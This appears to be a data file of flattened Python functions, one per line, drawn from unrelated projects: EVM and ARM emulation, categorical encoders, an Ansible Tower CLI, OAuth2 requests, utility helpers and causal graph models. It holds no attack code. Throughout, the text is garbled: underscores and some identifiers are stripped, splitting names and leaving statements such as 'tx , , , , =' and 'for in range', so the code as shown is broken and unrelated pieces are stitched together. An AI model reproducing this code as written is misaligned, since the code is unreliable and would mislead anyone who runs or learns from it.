def CREATE ( self , value , offset , size ) : address = self . world . create account ( address = EVM World . calculate new address ( sender = self . address , nonce = self . world . get nonce ( self . address ) ) ) self . world . start transaction ( 'CREATE' , address , data = self . read buffer ( offset , size ) , caller = self . address , value = value , gas = self . gas ) raise Start Tx ( )
def CREATE ( self , value , offset , size ) : tx = self . world . last transaction # At this point last and current tx are the same. address = tx . address if tx . result == 'RETURN' : self . world . set code ( tx . address , tx . return data ) else : self . world . delete account ( address ) address = 0 return address
def CALLCODE ( self , gas , ignored , value , in offset , in size , out offset , out size ) : self . world . start transaction ( 'CALLCODE' , address = self . address , data = self . read buffer ( in offset , in size ) , caller = self . address , value = value , gas = gas ) raise Start Tx ( )
def RETURN ( self , offset , size ) : data = self . read buffer ( offset , size ) raise End Tx ( 'RETURN' , data )
def SELFDESTRUCT ( self , recipient ) : #This may create a user account recipient = Operators . EXTRACT ( recipient , 0 , 160 ) address = self . address #FIXME for on the known addresses if issymbolic ( recipient ) : logger . info ( "Symbolic recipient on self destruct" ) recipient = solver . get value ( self . constraints , recipient ) if recipient not in self . world : self . world . create account ( address = recipient ) self . world . send funds ( address , recipient , self . world . get balance ( address ) ) self . world . delete account ( address ) raise End Tx ( 'SELFDESTRUCT' )
def current human transaction ( self ) : try : tx , , , , = self . callstack [ 0 ] if tx . result is not None : #That tx finished. No current tx. return None assert tx . depth == 0 return tx except Index Error : return None
def new address ( self , sender = None , nonce = None ) : if sender is not None and nonce is None : nonce = self . get nonce ( sender ) new address = self . calculate new address ( sender , nonce ) if sender is None and new address in self : return self . new address ( sender , nonce ) return new address
def swap mode ( self ) : assert self . mode in ( cs . CS MODE ARM , cs . CS MODE THUMB ) if self . mode == cs . CS MODE ARM : self . mode = cs . CS MODE THUMB else : self . mode = cs . CS MODE ARM
def LDRD ( cpu , dest1 , dest2 , src , offset = None ) : assert dest1 . type == 'register' assert dest2 . type == 'register' assert src . type == 'memory' mem1 = cpu . read int ( src . address ( ) , 32 ) mem2 = cpu . read int ( src . address ( ) + 4 , 32 ) writeback = cpu . compute writeback ( src , offset ) dest1 . write ( mem1 ) dest2 . write ( mem2 ) cpu . cs hack ldr str writeback ( src , offset , writeback )
def STRD ( cpu , src1 , src2 , dest , offset = None ) : assert src1 . type == 'register' assert src2 . type == 'register' assert dest . type == 'memory' val1 = src1 . read ( ) val2 = src2 . read ( ) writeback = cpu . compute writeback ( dest , offset ) cpu . write int ( dest . address ( ) , val1 , 32 ) cpu . write int ( dest . address ( ) + 4 , val2 , 32 ) cpu . cs hack ldr str writeback ( dest , offset , writeback )
def context ( self ) : plugin context name = str ( type ( self ) ) if plugin context name not in self . manticore . context : self . manticore . context [ plugin context name ] = { } return self . manticore . context [ plugin context name ]
def declare ( self , var ) : if var . name in self . declarations : raise Value Error ( 'Variable already declared' ) self . declarations [ var . name ] = var return var
def declarations ( self ) : declarations = Get Declarations ( ) for a in self . constraints : try : declarations . visit ( a ) except Runtime Error : # TODO: (defunct) move recursion management out of Pickle Serializer if sys . getrecursionlimit ( ) >= Pickle Serializer . MAX RECURSION : raise Exception ( f'declarations recursion limit surpassed {Pickle Serializer.MAX RECURSION}, aborting' ) new limit = sys . getrecursionlimit ( ) + Pickle Serializer . DEFAULT RECURSION if new limit <= Pickle Serializer . DEFAULT RECURSION : sys . setrecursionlimit ( new limit ) return self . declarations return declarations . result
def is declared ( self , expression var ) : if not isinstance ( expression var , Variable ) : raise Value Error ( f'Expression must be a Variable (not a {type(expression var)})' ) return any ( expression var is x for x in self . get declared variables ( ) )
def col transform ( self , col , digits ) : if col is None or float ( col ) < 0.0 : return None else : col = self . number to base ( int ( col ) , self . base , digits ) if len ( col ) == digits : return col else : return [ 0 for in range ( digits - len ( col ) ) ] + col
def transform leave one out ( self , X in , y , mapping = None ) : X = X in . copy ( deep = True ) random state = check random state ( self . random state ) # Prepare the data if y is not None : # Convert bools to numbers (the target must be summable) y = y . astype ( 'double' ) # Cumsum and cumcount do not work nicely with None. # This is a terrible workaround that will fail, when the # categorical input contains -999.9 for cat col in X . select dtypes ( 'category' ) . columns . values : X [ cat col ] = X [ cat col ] . cat . add categories ( - 999.9 ) X = X . fillna ( - 999.9 ) for col , colmap in mapping . items ( ) : level notunique = colmap [ 'count' ] > 1 unique train = colmap . index unseen values = pd . Series ( [ x for x in X in [ col ] . unique ( ) if x not in unique train ] ) is nan = X in [ col ] . isnull ( ) is unknown value = X in [ col ] . isin ( unseen values . dropna ( ) ) if self . handle unknown == 'error' and is unknown value . any ( ) : raise Value Error ( 'Columns to be encoded can not contain new values' ) if y is None : # Replace level with its mean target; if level occurs only once, use global mean level means = ( ( colmap [ 'sum' ] + self . mean ) / ( colmap [ 'count' ] + 1 ) ) . where ( level notunique , self . mean ) X [ col ] = X [ col ] . map ( level means ) else : # Simulation of Cat Boost implementation, which calculates leave-one-out on the fly. # The nice thing about this is that it helps to prevent overfitting. The bad thing # is that Cat Boost uses many iterations over the data. But we run just one iteration. # Still, it works better than leave-one-out without any noise. # See: #   https://tech.yandex.com/catboost/doc/dg/concepts/algorithm-main-stages cat-to-numberic-docpage/ temp = y . groupby ( X [ col ] ) . agg ( [ 'cumsum' , 'cumcount' ] ) X [ col ] = ( temp [ 'cumsum' ] - y + self . mean ) / ( temp [ 'cumcount' ] + 1 ) if self . handle unknown == 'value' : X . loc [ is unknown value , col ] = self . mean elif self . handle unknown == 'return nan' : X . loc [ is unknown value , col ] = np . nan if self . handle missing == 'value' : X . loc [ is nan & unseen values . isnull ( ) . any ( ) , col ] = self . mean elif self . handle missing == 'return nan' : X . loc [ is nan , col ] = np . nan if self . sigma is not None and y is not None : X [ col ] = X [ col ] * random state . normal ( 1. , self . sigma , X [ col ] . shape [ 0 ] ) return X
def get obj cols ( df ) : obj cols = [ ] for idx , dt in enumerate ( df . dtypes ) : if dt == 'object' or is category ( dt ) : obj cols . append ( df . columns . values [ idx ] ) return obj cols
def convert input ( X ) : if not isinstance ( X , pd . Data Frame ) : if isinstance ( X , list ) : X = pd . Data Frame ( X ) elif isinstance ( X , ( np . generic , np . ndarray ) ) : X = pd . Data Frame ( X ) elif isinstance ( X , csr matrix ) : X = pd . Data Frame ( X . todense ( ) ) elif isinstance ( X , pd . Series ) : X = pd . Data Frame ( X ) else : raise Value Error ( 'Unexpected input type: %s' % ( str ( type ( X ) ) ) ) X = X . apply ( lambda x : pd . to numeric ( x , errors = 'ignore' ) ) return X
def transform leave one out ( self , X in , y , mapping = None ) : X = X in . copy ( deep = True ) random state = check random state ( self . random state ) for col , colmap in mapping . items ( ) : level notunique = colmap [ 'count' ] > 1 unique train = colmap . index unseen values = pd . Series ( [ x for x in X [ col ] . unique ( ) if x not in unique train ] ) is nan = X [ col ] . isnull ( ) is unknown value = X [ col ] . isin ( unseen values . dropna ( ) ) if self . handle unknown == 'error' and is unknown value . any ( ) : raise Value Error ( 'Columns to be encoded can not contain new values' ) if y is None : # Replace level with its mean target; if level occurs only once, use global mean level means = ( colmap [ 'sum' ] / colmap [ 'count' ] ) . where ( level notunique , self . mean ) X [ col ] = X [ col ] . map ( level means ) else : # Replace level with its mean target, calculated excluding this row's target # The y (target) mean for this level is normally just the sum/count; # excluding this row's y, it's (sum - y) / (count - 1) level means = ( X [ col ] . map ( colmap [ 'sum' ] ) - y ) / ( X [ col ] . map ( colmap [ 'count' ] ) - 1 ) # The 'where' fills in singleton levels (count = 1 -> div by 0) with the global mean X [ col ] = level means . where ( X [ col ] . map ( colmap [ 'count' ] [ level notunique ] ) . notnull ( ) , self . mean ) if self . handle unknown == 'value' : X . loc [ is unknown value , col ] = self . mean elif self . handle unknown == 'return nan' : X . loc [ is unknown value , col ] = np . nan if self . handle missing == 'value' : X . loc [ is nan & unseen values . isnull ( ) . any ( ) , col ] = self . mean elif self . handle missing == 'return nan' : X . loc [ is nan , col ] = np . nan if self . sigma is not None and y is not None : X [ col ] = X [ col ] * random state . normal ( 1. , self . sigma , X [ col ] . shape [ 0 ] ) return X
def score models ( clf , X , y , encoder , runs = 1 ) : scores = [ ] X test = None for in range ( runs ) : X test = encoder ( ) . fit transform ( X , y ) # Some models, like logistic regression, like normalized features otherwise they underperform and/or take a long time to converge. # To be rigorous, we should have trained the normalization on each fold individually via pipelines. # See grid search example to learn how to do it. X test = Standard Scaler ( ) . fit transform ( X test ) scores . append ( cross validate ( clf , X test , y , n jobs = 1 , cv = 5 ) [ 'test score' ] ) gc . collect ( ) scores = [ y for z in [ x for x in scores ] for y in z ] return float ( np . mean ( scores ) ) , float ( np . std ( scores ) ) , scores , X test . shape [ 1 ]
def main ( loader , name ) : scores = [ ] raw scores ds = { } # first get the dataset X , y , mapping = loader ( ) clf = linear model . Logistic Regression ( solver = 'lbfgs' , multi class = 'auto' , max iter = 200 , random state = 0 ) # try each encoding method available, which works on multiclass problems encoders = ( set ( category encoders . all ) - { 'WOE Encoder' } ) # Wo E is currently only for binary targets for encoder name in encoders : encoder = getattr ( category encoders , encoder name ) start time = time . time ( ) score , stds , raw scores , dim = score models ( clf , X , y , encoder ) scores . append ( [ encoder name , name , dim , score , stds , time . time ( ) - start time ] ) raw scores ds [ encoder name ] = raw scores gc . collect ( ) results = pd . Data Frame ( scores , columns = [ 'Encoding' , 'Dataset' , 'Dimensionality' , 'Avg. Score' , 'Score St Dev' , 'Elapsed Time' ] ) raw = pd . Data Frame . from dict ( raw scores ds ) ax = raw . plot ( kind = 'box' , return type = 'axes' ) plt . title ( 'Scores for Encodings on %s Dataset' % ( name , ) ) plt . ylabel ( 'Score (higher is better)' ) for tick in ax . get xticklabels ( ) : tick . set rotation ( 90 ) plt . grid ( ) plt . tight layout ( ) plt . show ( ) return results , raw
def format options ( self , ctx , formatter ) : field opts = [ ] global opts = [ ] local opts = [ ] other opts = [ ] for param in self . params : if param . name in SETTINGS PARMS : opts = global opts elif getattr ( param , 'help' , None ) and param . help . startswith ( '[FIELD]' ) : opts = field opts param . help = param . help [ len ( '[FIELD]' ) : ] else : opts = local opts rv = param . get help record ( ctx ) if rv is None : continue else : opts . append ( rv ) if self . add help option : help options = self . get help option names ( ctx ) if help options : other opts . append ( [ join options ( help options ) [ 0 ] , 'Show this message and exit.' ] ) if field opts : with formatter . section ( 'Field Options' ) : formatter . write dl ( field opts ) if local opts : with formatter . section ( 'Local Options' ) : formatter . write dl ( local opts ) if global opts : with formatter . section ( 'Global Options' ) : formatter . write dl ( global opts ) if other opts : with formatter . section ( 'Other Options' ) : formatter . write dl ( other opts )
def convert pagenum ( self , kwargs ) : for key in ( 'next' , 'previous' ) : if not kwargs . get ( key ) : continue match = re . search ( r'page=(?P<num>[\d]+)' , kwargs [ key ] ) if match is None and key == 'previous' : kwargs [ key ] = 1 continue kwargs [ key ] = int ( match . groupdict ( ) [ 'num' ] )
def disassoc ( self , url fragment , me , other ) : # Get the endpoint for foreign records within this object. url = self . endpoint + '%d/%s/' % ( me , url fragment ) # Attempt to determine whether the other record already is absent, for the "changed" moniker. r = client . get ( url , params = { 'id' : other } ) . json ( ) if r [ 'count' ] == 0 : return { 'changed' : False } # Send a request removing the foreign record from this one. r = client . post ( url , data = { 'disassociate' : True , 'id' : other } ) return { 'changed' : True }
def last job data ( self , pk = None , * * kwargs ) : ujt = self . get ( pk , include debug header = True , * * kwargs ) # Determine the appropriate inventory source update. if 'current update' in ujt [ 'related' ] : debug . log ( 'A current job; retrieving it.' , header = 'details' ) return client . get ( ujt [ 'related' ] [ 'current update' ] [ 7 : ] ) . json ( ) elif ujt [ 'related' ] . get ( 'last update' , None ) : debug . log ( 'No current job or update exists; retrieving the most recent.' , header = 'details' ) return client . get ( ujt [ 'related' ] [ 'last update' ] [ 7 : ] ) . json ( ) else : raise exc . Not Found ( 'No related jobs or updates exist.' )
def lookup stdout ( self , pk = None , start line = None , end line = None , full = True ) : stdout url = '%s%s/stdout/' % ( self . unified job type , pk ) payload = { 'format' : 'json' , 'content encoding' : 'base64' , 'content format' : 'ansi' } if start line : payload [ 'start line' ] = start line if end line : payload [ 'end line' ] = end line debug . log ( 'Requesting a copy of job standard output' , header = 'details' ) resp = client . get ( stdout url , params = payload ) . json ( ) content = b64decode ( resp [ 'content' ] ) return content . decode ( 'utf-8' , 'replace' )
def version ( ) : # Print out the current version of Tower CLI. click . echo ( 'Tower CLI %s' % version ) # Print out the current API version of the current code base. click . echo ( 'API %s' % CUR API VERSION ) # Attempt to connect to the Ansible Tower server. # If we succeed, print a version; if not, generate a failure. try : r = client . get ( '/config/' ) except Request Exception as ex : raise exc . Tower CLI Error ( 'Could not connect to Ansible Tower.\n%s' % six . text type ( ex ) ) config = r . json ( ) license = config . get ( 'license info' , { } ) . get ( 'license type' , 'open' ) if license == 'open' : server type = 'AWX' else : server type = 'Ansible Tower' click . echo ( '%s %s' % ( server type , config [ 'version' ] ) ) # Print out Ansible version of server click . echo ( 'Ansible %s' % config [ 'ansible version' ] )
def echo setting ( key ) : value = getattr ( settings , key ) secho ( '%s: ' % key , fg = 'magenta' , bold = True , nl = False ) secho ( six . text type ( value ) , bold = True , fg = 'white' if isinstance ( value , six . text type ) else 'cyan' , )
def login ( username , password , scope , client id , client secret , verbose ) : if not supports oauth ( ) : raise exc . Tower CLI Error ( 'This version of Tower does not support O Auth2.0. Set credentials using tower-cli config.' ) # Explicitly set a basic auth header for PAT acquisition (so that we don't # try to auth w/ an existing user+pass or oauth2 token in a config file) req = collections . namedtuple ( 'req' , 'headers' ) ( { } ) if client id and client secret : HTTP Basic Auth ( client id , client secret ) ( req ) req . headers [ 'Content-Type' ] = 'application/x-www-form-urlencoded' r = client . post ( '/o/token/' , data = { "grant type" : "password" , "username" : username , "password" : password , "scope" : scope } , headers = req . headers ) elif client id : req . headers [ 'Content-Type' ] = 'application/x-www-form-urlencoded' r = client . post ( '/o/token/' , data = { "grant type" : "password" , "username" : username , "password" : password , "client id" : client id , "scope" : scope } , headers = req . headers ) else : HTTP Basic Auth ( username , password ) ( req ) r = client . post ( '/users/{}/personal tokens/' . format ( username ) , data = { "description" : "Tower CLI" , "application" : None , "scope" : scope } , headers = req . headers ) if r . ok : result = r . json ( ) result . pop ( 'summary fields' , None ) result . pop ( 'related' , None ) if client id : token = result . pop ( 'access token' , None ) else : token = result . pop ( 'token' , None ) if settings . verbose : # only print the actual token if -v result [ 'token' ] = token secho ( json . dumps ( result , indent = 1 ) , fg = 'blue' , bold = True ) config . main ( [ 'oauth token' , token , '--scope=user' ] )
def convert ( self , value , param , ctx ) : # Protect against corner cases of invalid inputs if not isinstance ( value , str ) : return value if isinstance ( value , six . binary type ) : value = value . decode ( 'UTF-8' ) # Read from a file under these cases if value . startswith ( '@' ) : filename = os . path . expanduser ( value [ 1 : ] ) file obj = super ( Variables , self ) . convert ( filename , param , ctx ) if hasattr ( file obj , 'read' ) : # Sometimes click.File may return a buffer and not a string return file obj . read ( ) return file obj # No file, use given string return value
def set display columns ( self , set true = [ ] , set false = [ ] ) : for i in range ( len ( self . fields ) ) : if self . fields [ i ] . name in set true : self . fields [ i ] . display = True elif self . fields [ i ] . name in set false : self . fields [ i ] . display = False
def separate ( self , kwargs ) : self . pop none ( kwargs ) result = { } for field in Resource . config fields : if field in kwargs : result [ field ] = kwargs . pop ( field ) if field in Resource . json fields : # If result[field] is not a string we can continue on if not isinstance ( result [ field ] , six . string types ) : continue try : data = json . loads ( result [ field ] ) result [ field ] = data except Value Error : raise exc . Tower CLI Error ( 'Provided json file format ' 'invalid. Please recheck.' ) return result
def format id ( self , payload ) : if 'id' in payload : return str ( payload [ 'id' ] ) if 'results' in payload : return ' ' . join ( [ six . text type ( item [ 'id' ] ) for item in payload [ 'results' ] ] ) raise Multiple Related Error ( 'Could not serialize output with id format.' )
def list resource commands ( self ) : resource path = os . path . abspath ( os . path . join ( os . path . dirname ( file ) , os . pardir , 'resources' ) ) answer = set ( [ ] ) for , name , in pkgutil . iter modules ( [ resource path ] ) : res = tower cli . get resource ( name ) if not getattr ( res , 'internal' , False ) : answer . add ( name ) return sorted ( answer )
def new state ( self ) : try : self . state = self . state ( ) log . debug ( "Generated new state %s." , self . state ) except Type Error : self . state = self . state log . debug ( "Re-using previously supplied state %s." , self . state ) return self . state
def request ( self , method , url , data = None , headers = None , withhold token = False , client id = None , client secret = None , * * kwargs ) : if not is secure transport ( url ) : raise Insecure Transport Error ( ) if self . token and not withhold token : log . debug ( "Invoking %d protected resource request hooks." , len ( self . compliance hook [ "protected request" ] ) , ) for hook in self . compliance hook [ "protected request" ] : log . debug ( "Invoking hook %s." , hook ) url , headers , data = hook ( url , headers , data ) log . debug ( "Adding token %s to request." , self . token ) try : url , headers , data = self . client . add token ( url , http method = method , body = data , headers = headers ) # Attempt to retrieve and save new access token if expired except Token Expired Error : if self . auto refresh url : log . debug ( "Auto refresh is set, attempting to refresh at %s." , self . auto refresh url , ) # We mustn't pass auth twice. auth = kwargs . pop ( "auth" , None ) if client id and client secret and ( auth is None ) : log . debug ( 'Encoding client id "%s" with client secret as Basic auth credentials.' , client id , ) auth = requests . auth . HTTP Basic Auth ( client id , client secret ) token = self . refresh token ( self . auto refresh url , auth = auth , * * kwargs ) if self . token updater : log . debug ( "Updating token to %s using %s." , token , self . token updater ) self . token updater ( token ) url , headers , data = self . client . add token ( url , http method = method , body = data , headers = headers ) else : raise Token Updated ( token ) else : raise log . debug ( "Requesting url %s using method %s." , url , method ) log . debug ( "Supplying headers %s and data %s" , headers , data ) log . debug ( "Passing through key word arguments %s." , kwargs ) return super ( O Auth2Session , self ) . request ( method , url , headers = headers , data = data , * * kwargs )
def clear ( self , cfgstr = None ) : data fpath = self . get fpath ( cfgstr ) if self . verbose > 0 : self . log ( '[cacher] clear cache' ) if exists ( data fpath ) : if self . verbose > 0 : self . log ( '[cacher] removing {}' . format ( data fpath ) ) os . remove ( data fpath ) # Remove the metadata if it exists meta fpath = data fpath + '.meta' if exists ( meta fpath ) : os . remove ( meta fpath ) else : if self . verbose > 0 : self . log ( '[cacher] ... nothing to clear' )
def get certificate ( self , cfgstr = None ) : certificate = self . cacher . tryload ( cfgstr = cfgstr ) return certificate
def rectify products ( self , product = None ) : products = self . product if product is None else product if products is None : return None if not isinstance ( products , ( list , tuple ) ) : products = [ products ] return products
def product file hash ( self , product = None ) : if self . hasher is None : return None else : products = self . rectify products ( product ) product file hash = [ util hash . hash file ( p , hasher = self . hasher , base = 'hex' ) for p in products ] return product file hash
def write ( self , msg ) : if self . redirect is not None : self . redirect . write ( msg ) if six . PY2 : from xdoctest . utils . util str import ensure unicode msg = ensure unicode ( msg ) super ( Tee String IO , self ) . write ( msg )
def flush ( self ) : # nocover if self . redirect is not None : self . redirect . flush ( ) super ( Tee String IO , self ) . flush ( )
def log part ( self ) : self . cap stdout . seek ( self . pos ) text = self . cap stdout . read ( ) self . pos = self . cap stdout . tell ( ) self . parts . append ( text ) self . text = text
def join itemstrs ( itemstrs , itemsep , newlines , leaf info , nobraces , trailing sep , compact brace , lbr , rbr ) : # positive newlines means start counting from the root use newline = newlines > 0 # negative countdown values mean start counting from the leafs # if compact brace < 0: #     compact brace = (-compact brace) >=  leaf info['max height'] if newlines < 0 : use newline = ( - newlines ) < leaf info [ 'max height' ] if use newline : sep = ',\n' if nobraces : body str = sep . join ( itemstrs ) if trailing sep and len ( itemstrs ) > 0 : body str += ',' retstr = body str else : if compact brace : # Why must we modify the indentation below and not here? # prefix = '' # rest = [ub.indent(s, prefix) for s in itemstrs[1:]] # indented = itemstrs[0:1] + rest indented = itemstrs else : import ubelt as ub prefix = ' ' * 4 indented = [ ub . indent ( s , prefix ) for s in itemstrs ] body str = sep . join ( indented ) if trailing sep and len ( itemstrs ) > 0 : body str += ',' if compact brace : # Why can we modify the indentation here but not above? braced body str = ( lbr + body str . replace ( '\n' , '\n ' ) + rbr ) else : braced body str = ( lbr + '\n' + body str + '\n' + rbr ) retstr = braced body str else : sep = ',' + itemsep body str = sep . join ( itemstrs ) if trailing sep and len ( itemstrs ) > 0 : body str += ',' retstr = ( lbr + body str + rbr ) return retstr
def list itemstrs ( list , * * kwargs ) : items = list ( list ) kwargs [ ' return info' ] = True tups = [ repr2 ( item , * * kwargs ) for item in items ] itemstrs = [ t [ 0 ] for t in tups ] max height = max ( [ t [ 1 ] [ 'max height' ] for t in tups ] ) if tups else 0 leaf info = { 'max height' : max height + 1 , } sort = kwargs . get ( 'sort' , None ) if sort is None : # Force orderings on sets. sort = isinstance ( list , ( set , frozenset ) ) if sort : itemstrs = sort itemstrs ( items , itemstrs ) return itemstrs , leaf info
def register ( self , type ) : def decorator ( func ) : if isinstance ( type , tuple ) : for t in type : self . func registry [ t ] = func else : self . func registry [ type ] = func return func return decorator
def register numpy extensions ( self ) : # system checks import numpy as np numpy floating types = ( np . float16 , np . float32 , np . float64 ) if hasattr ( np , 'float128' ) : # nocover numpy floating types = numpy floating types + ( np . float128 , ) @ self . add iterable check def is object ndarray ( data ) : # ndarrays of objects cannot be hashed directly. return isinstance ( data , np . ndarray ) and data . dtype . kind == 'O' @ self . register ( np . ndarray ) def hash numpy array ( data ) : if data . dtype . kind == 'O' : msg = 'directly hashing ndarrays with dtype=object is unstable' raise Type Error ( msg ) else : # tobytes() views the array in 1D (via ravel()) # encode the shape as well header = b'' . join ( hashable sequence ( ( len ( data . shape ) , data . shape ) ) ) dtype = b'' . join ( hashable sequence ( data . dtype . descr ) ) hashable = header + dtype + data . tobytes ( ) prefix = b'NDARR' return prefix , hashable @ self . register ( ( np . int64 , np . int32 , np . int16 , np . int8 ) + ( np . uint64 , np . uint32 , np . uint16 , np . uint8 ) ) def hash numpy int ( data ) : return convert to hashable ( int ( data ) ) @ self . register ( numpy floating types ) def hash numpy float ( data ) : return convert to hashable ( float ( data ) ) @ self . register ( np . random . Random State ) def hash numpy random state ( data ) : hashable = b'' . join ( hashable sequence ( data . get state ( ) ) ) prefix = b'RNG' return prefix , hashable
def proc async iter stream ( proc , stream , buffersize = 1 ) : from six . moves import queue from threading import Thread def enqueue output ( proc , stream , stream queue ) : while proc . poll ( ) is None : line = stream . readline ( ) # print('ENQUEUE LIVE {!r} {!r}'.format(stream, line)) stream queue . put ( line ) for line in textio iterlines ( stream ) : # print('ENQUEUE FINAL {!r} {!r}'.format(stream, line)) stream queue . put ( line ) # print("STREAM IS DONE {!r}".format(stream)) stream queue . put ( None ) # signal that the stream is finished # stream.close() stream queue = queue . Queue ( maxsize = buffersize ) thread = Thread ( target = enqueue output , args = ( proc , stream , stream queue ) ) thread . daemon = True # thread dies with the program thread . start ( ) return stream queue
def extension module tags ( ) : import sysconfig tags = [ ] if six . PY2 : # see also 'SHLIB EXT' multiarch = sysconfig . get config var ( 'MULTIARCH' ) if multiarch is not None : tags . append ( multiarch ) else : # handle PEP 3149 -- ABI version tagged .so files # ABI = application binary interface tags . append ( sysconfig . get config var ( 'SOABI' ) ) tags . append ( 'abi3' ) # not sure why this one is valid but it is tags = [ t for t in tags if t ] return tags
def symlink ( path , link , overwrite = 0 , verbose = 0 ) : if exists ( link ) and not os . path . islink ( link ) : # On windows a broken link might still exist as a hard link or a # junction. Overwrite it if it is a file and we cannot symlink. # However, if it is a non-junction directory then do not overwrite if verbose : print ( 'link location already exists' ) is junc = win32 is junction ( link ) # NOTE: # in python2 broken junctions are directories and exist # in python3 broken junctions are directories and do not exist if os . path . isdir ( link ) : if is junc : pointed = win32 read junction ( link ) if path == pointed : if verbose : print ( '...and is a junction that points to the same place' ) return link else : if verbose : if not exists ( pointed ) : print ( '...and is a broken junction that points somewhere else' ) else : print ( '...and is a junction that points somewhere else' ) else : if verbose : print ( '...and is an existing real directory!' ) raise IO Error ( 'Cannot overwrite a real directory' ) elif os . path . isfile ( link ) : if win32 is hardlinked ( link , path ) : if verbose : print ( '...and is a hard link that points to the same place' ) return link else : if verbose : print ( '...and is a hard link that points somewhere else' ) if win32 can symlink ( ) : raise IO Error ( 'Cannot overwrite potentially real file if we can symlink' ) if overwrite : if verbose : print ( '...overwriting' ) util io . delete ( link , verbose > 1 ) else : if exists ( link ) : raise IO Error ( 'Link already exists' ) win32 symlink2 ( path , link , verbose = verbose )
def win32 dir ( path , star = '' ) : from ubelt import util cmd import re wrapper = 'cmd /S /C "{}"' # the /S will preserve all inner quotes command = 'dir /-C "{}"{}' . format ( path , star ) wrapped = wrapper . format ( command ) info = util cmd . cmd ( wrapped , shell = True ) if info [ 'ret' ] != 0 : from ubelt import util format print ( 'Failed command:' ) print ( info [ 'command' ] ) print ( util format . repr2 ( info , nl = 1 ) ) raise OS Error ( str ( info ) ) # parse the output of dir to get some info # Remove header and footer lines = info [ 'out' ] . split ( '\n' ) [ 5 : - 3 ] splitter = re . compile ( '( +)' ) for line in lines : parts = splitter . split ( line ) date , sep , time , sep , ampm , sep , type or size , sep = parts [ : 8 ] name = '' . join ( parts [ 8 : ] ) # if type is a junction then name will also contain the linked loc if name == '.' or name == '..' : continue if type or size in [ '<JUNCTION>' , '<SYMLINKD>' , '<SYMLINK>' ] : # colons cannot be in path names, so use that to find where # the name ends pos = name . find ( ':' ) bpos = name [ : pos ] . rfind ( '[' ) name = name [ : bpos - 1 ] pointed = name [ bpos + 1 : - 1 ] yield type or size , name , pointed else : yield type or size , name , None
def parse ( config ) : if not isinstance ( config , basestring ) : raise Type Error ( "Contains input must be a simple string" ) validator = Contains Validator ( ) validator . contains string = config return validator
def retrieve adjacency matrix ( graph , order nodes = None , weight = False ) : if isinstance ( graph , np . ndarray ) : return graph elif isinstance ( graph , nx . Di Graph ) : if order nodes is None : order nodes = graph . nodes ( ) if not weight : return np . array ( nx . adjacency matrix ( graph , order nodes , weight = None ) . todense ( ) ) else : return np . array ( nx . adjacency matrix ( graph , order nodes ) . todense ( ) ) else : raise Type Error ( "Only networkx.Di Graph and np.ndarray (adjacency matrixes) are supported." )
def init variables ( self , verbose = False ) : for j in range ( 1 , self . nodes ) : nb parents = np . random . randint ( 0 , min ( [ self . parents max , j ] ) + 1 ) for i in np . random . choice ( range ( 0 , j ) , nb parents , replace = False ) : self . adjacency matrix [ i , j ] = 1 try : self . g = nx . Di Graph ( self . adjacency matrix ) assert not list ( nx . simple cycles ( self . g ) ) except Assertion Error : if verbose : print ( "Regenerating, graph non valid..." ) self . init variables ( ) # Mechanisms self . cfunctions = [ self . mechanism ( int ( sum ( self . adjacency matrix [ : , i ] ) ) , self . points , self . noise , noise coeff = self . noise coeff ) if sum ( self . adjacency matrix [ : , i ] ) else self . initial generator for i in range ( self . nodes ) ]
def generate ( self , rescale = True ) : if self . cfunctions is None : self . init variables ( ) for i in nx . topological sort ( self . g ) : # Root cause if not sum ( self . adjacency matrix [ : , i ] ) : self . data [ 'V{}' . format ( i ) ] = self . cfunctions [ i ] ( self . points ) # Generating causes else : self . data [ 'V{}' . format ( i ) ] = self . cfunctions [ i ] ( self . data . iloc [ : , self . adjacency matrix [ : , i ] . nonzero ( ) [ 0 ] ] . values ) if rescale : self . data [ 'V{}' . format ( i ) ] = scale ( self . data [ 'V{}' . format ( i ) ] . values ) return self . g , self . data
def graph evaluation ( data , adj matrix , gpu = None , gpu id = 0 , * * kwargs ) : gpu = SETTINGS . get default ( gpu = gpu ) device = 'cuda:{}' . format ( gpu id ) if gpu else 'cpu' obs = th . Float Tensor ( data ) . to ( device ) cgnn = CGNN model ( adj matrix , data . shape [ 0 ] , gpu id = gpu id , * * kwargs ) . to ( device ) cgnn . reset parameters ( ) return cgnn . run ( obs , * * kwargs )
def parallel graph evaluation ( data , adj matrix , nb runs = 16 , nb jobs = None , * * kwargs ) : nb jobs = SETTINGS . get default ( nb jobs = nb jobs ) if nb runs == 1 : return graph evaluation ( data , adj matrix , * * kwargs ) else : output = Parallel ( n jobs = nb jobs ) ( delayed ( graph evaluation ) ( data , adj matrix , idx = run , gpu id = run % SETTINGS . GPU , * * kwargs ) for run in range ( nb runs ) ) return np . mean ( output )
def forward ( self ) : self . noise . data . normal ( ) if not self . confounding : for i in self . topological order : self . generated [ i ] = self . blocks [ i ] ( th . cat ( [ v for c in [ [ self . generated [ j ] for j in np . nonzero ( self . adjacency matrix [ : , i ] ) [ 0 ] ] , [ self . noise [ : , [ i ] ] ] ] for v in c ] , 1 ) ) else : for i in self . topological order : self . generated [ i ] = self . blocks [ i ] ( th . cat ( [ v for c in [ [ self . generated [ j ] for j in np . nonzero ( self . adjacency matrix [ : , i ] ) [ 0 ] ] , [ self . corr noise [ min ( i , j ) , max ( i , j ) ] for j in np . nonzero ( self . i adj matrix [ : , i ] ) [ 0 ] ] [ self . noise [ : , [ i ] ] ] ] for v in c ] , 1 ) ) return th . cat ( self . generated , 1 )
def run ( self , data , train epochs = 1000 , test epochs = 1000 , verbose = None , idx = 0 , lr = 0.01 , * * kwargs ) : verbose = SETTINGS . get default ( verbose = verbose ) optim = th . optim . Adam ( self . parameters ( ) , lr = lr ) self . score . zero ( ) with trange ( train epochs + test epochs , disable = not verbose ) as t : for epoch in t : optim . zero grad ( ) generated data = self . forward ( ) mmd = self . criterion ( generated data , data ) if not epoch % 200 : t . set postfix ( idx = idx , epoch = epoch , loss = mmd . item ( ) ) mmd . backward ( ) optim . step ( ) if epoch >= test epochs : self . score . add ( mmd . data ) return self . score . cpu ( ) . numpy ( ) / test epochs
